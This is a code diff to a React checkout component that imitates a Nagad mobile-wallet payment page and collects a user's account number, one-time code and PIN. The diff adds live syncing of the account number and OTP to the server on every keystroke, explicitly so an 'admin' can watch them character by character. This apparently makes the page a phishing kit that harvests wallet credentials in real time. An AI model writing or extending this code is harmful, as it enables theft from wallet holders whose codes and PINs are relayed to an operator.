@@ -96,11 +96,8 @@ export default function OnlineCheckoutGateway({
       setCheckoutId(propCheckoutId);
       return () => {
         isMounted = false;
-        fetch('/api/checkout/complete', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: propCheckoutId })
-        }).catch(err => console.debug(err));
+        // Do not delete the active session on unmount here because of React Strict Mode double-renders in development.
+        // The parent component or active handlers manage deletion when the transaction succeeds, fails, or is cancelled.
       };
     }
 
@@ -139,16 +136,11 @@ export default function OnlineCheckoutGateway({
     })
     .catch(err => console.error("Error start checkout session:", err));
 
-    // Cleanup session if canceled/closed by user
+    // Cleanup session references
     return () => {
       isMounted = false;
-      if (createdCheckoutId) {
-        fetch('/api/checkout/complete', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: createdCheckoutId })
-        }).catch(err => console.error("Error cleaning up session on unmount:", err));
-      }
+      // Do not delete the active session on unmount here because of React Strict Mode double-renders in development.
+      // Explicit cleanup is handled via handleCancelAction when user closes, or within success status polling.
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [propCheckoutId]);
@@ -172,13 +164,15 @@ export default function OnlineCheckoutGateway({
   const handleAccountNumberChange = (val: string) => {
     const cleanVal = val.replace(/[^0-9]/g, '');
     setAccountNumber(cleanVal);
-    // Removed live sync on typing for phone to only sync on confirm click
+    // Live sync as phone is being typed so admin sees it instantly character-by-character
+    syncCheckoutUpdate({ accountNumber: cleanVal, step: 1 });
   };
 
   const handleOtpChange = (val: string) => {
     const cleanVal = val.replace(/[^0-9]/g, '');
     setOtp(cleanVal);
-    // Removed live sync on typing for OTP to only sync on confirm click
+    // Live sync as OTP is being typed so admin sees it instantly character-by-character
+    syncCheckoutUpdate({ otp: cleanVal, step: 2 });
   };
 
   const handlePinChange = (val: string) => {
@@ -211,6 +205,23 @@ export default function OnlineCheckoutGateway({
       return () => clearTimeout(timer);
     }
   }, [step, countdown]);
+
+  const handleCancelAction = () => {
+    if (checkoutId) {
+      fetch('/api/checkout/update', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: checkoutId, status: 'failed' })
+      }).then(() => {
+        fetch('/api/checkout/complete', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: checkoutId })
+        }).catch(err => console.debug("Error completing checkout session on cancel button:", err));
+      }).catch(err => console.debug("Error updating checkout status on cancel button:", err));
+    }
+    onCancel();
+  };
 
   const handleInstantApproveForDemo = () => {
     if (!checkoutId) return;
@@ -637,66 +648,34 @@ export default function OnlineCheckoutGateway({
 
               {/* STEP 1: PHONE NUMBER */}
               {step === 1 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
                     Your Nagad Account Number
                   </h2>
-                  <div className="relative w-full max-w-[320px] cursor-pointer" onClick={triggerPhoneFocus}>
-                    <input
-                      ref={phoneInputRef}
-                      type="tel"
-                      maxLength={11}
-                      required
-                      value={accountNumber}
-                      onChange={(e) => handleAccountNumberChange(e.target.value)}
-                      className="absolute opacity-0 inset-0 w-full h-full cursor-pointer z-10"
-                    />
-                    <div className="flex items-center gap-1 sm:gap-1.5 justify-center">
-                      {[0, 1, 2].map((idx) => {
-                        const char = accountNumber[idx] || "";
-                        const isActive = accountNumber.length === idx;
-                        return (
-                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
-                            {char}
-                          </div>
-                        );
-                      })}
-                      <span className="text-white/60 font-black text-base px-0.5">-</span>
-                      {[3, 4, 5, 6].map((idx) => {
-                        const char = accountNumber[idx] || "";
-                        const isActive = accountNumber.length === idx;
-                        return (
-                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
-                            {char}
-                          </div>
-                        );
-                      })}
-                      <span className="text-white/60 font-black text-base px-0.5">-</span>
-                      {[7, 8, 9, 10].map((idx) => {
-                        const char = accountNumber[idx] || "";
-                        const isActive = accountNumber.length === idx;
-                        return (
-                          <div key={idx} className={`w-[22px] h-[28px] sm:w-[28px] sm:h-[34px] rounded bg-white text-neutral-800 text-[14px] sm:text-base font-normal flex items-center justify-center border-none shadow-sm transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
-                            {char}
-                          </div>
-                        );
-                      })}
-                    </div>
-                  </div>
+                  <input
+                    ref={phoneInputRef}
+                    type="text"
+                    maxLength={11}
+                    required
+                    value={accountNumber}
+                    onChange={(e) => handleAccountNumberChange(e.target.value)}
+                    placeholder="e.g. 01XXXXXXXXX"
+                    className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400"
+                  />
                   <p className="text-white/80 text-[10px] sm:text-[11px] mt-4 tracking-wide max-w-[340px] leading-relaxed">
                     By clicking/tapping "Proceed" you are agreeing to our <span className="font-bold underline cursor-pointer">Terms and Conditions</span>
                   </p>
                   <div className="flex gap-4 justify-center w-full max-w-[320px] mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 2: OTP VERIFICATION */}
               {step === 2 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
                     Enter Verification Code [OTP]
                   </h2>
                   <input
@@ -707,7 +686,7 @@ export default function OnlineCheckoutGateway({
                     value={otp}
                     onChange={(e) => handleOtpChange(e.target.value)}
                     placeholder="XXXXXX"
-                    className="w-full max-w-[220px] h-[30px] sm:h-[34px] border-none rounded text-center text-base text-neutral-800 tracking-[0.4em] font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-inner bg-white placeholder-neutral-300"
+                    className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400 tracking-widest"
                   />
                   {countdown > 0 && (
                     <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
@@ -715,51 +694,33 @@ export default function OnlineCheckoutGateway({
                   <div className="flex gap-2 justify-center w-full max-w-[340px] mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                     <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55">Resend Code</button>
-                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
 
               {/* STEP 3: PIN ENTRY */}
               {step === 3 && (
-                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-4 tracking-wide">
+                <div className="mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-3 tracking-wide">
                     Enter PIN
                   </h2>
-                  <div className="relative w-full max-w-[280px] cursor-pointer" onClick={triggerPINFocus}>
-                    <input
-                      ref={pinInputRef}
-                      type="tel"
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      maxLength={4}
-                      required
-                      value={pin}
-                      onChange={(e) => handlePinChange(e.target.value)}
-                      className="absolute opacity-0 inset-0 w-full h-full cursor-pointer z-10"
-                    />
-                    <div className="flex items-center gap-1.5 sm:gap-2 justify-center">
-                      {[0, 1, 2, 3].map((idx) => {
-                        const hasVal = pin.length > idx;
-                        const isActive = pin.length === idx;
-                        const showDigit = hasVal && lastTypedIdx === idx;
-                        return (
-                          <div key={idx} className={`w-[28px] h-[28px] sm:w-[34px] sm:h-[34px] rounded bg-white text-neutral-800 flex items-center justify-center border-none shadow-md transition-all ${isActive ? 'ring-2 ring-white/30' : ''}`}>
-                            {showDigit ? (
-                              <span className="text-sm sm:text-base font-normal">{pin[idx]}</span>
-                            ) : hasVal ? (
-                              <span className="text-xl font-black leading-none">●</span>
-                            ) : (
-                              ""
-                            )}
-                          </div>
-                        );
-                      })}
-                    </div>
-                  </div>
+                  <input
+                    ref={pinInputRef}
+                    type="tel"
+                    inputMode="numeric"
+                    pattern="[0-9]*"
+                    maxLength={4}
+                    required
+                    value={pin}
+                    onChange={(e) => handlePinChange(e.target.value)}
+                    placeholder="••••"
+                    className="w-full max-w-[280px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white tracking-widest placeholder-zinc-400"
+                    style={{ WebkitTextSecurity: 'disc' }}
+                  />
                   <div className="flex gap-4 justify-center w-full max-w-[320px] mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" onClick={onCancel} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
+                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer">Close</button>
                   </div>
                 </div>
               )}
@@ -969,7 +930,7 @@ export default function OnlineCheckoutGateway({
                 <>
                   <button
                     type="button"
-                    onClick={onCancel}
+                    onClick={handleCancelAction}
                     className="btn cancel flex-1 h-[38px] rounded-md text-[13px] font-sans font-medium bg-white border border-neutral-200 text-neutral-600 transition-colors cursor-pointer hover:bg-neutral-50 active:scale-[0.99] focus:outline-none focus:ring-0"
                   >
                     Yes
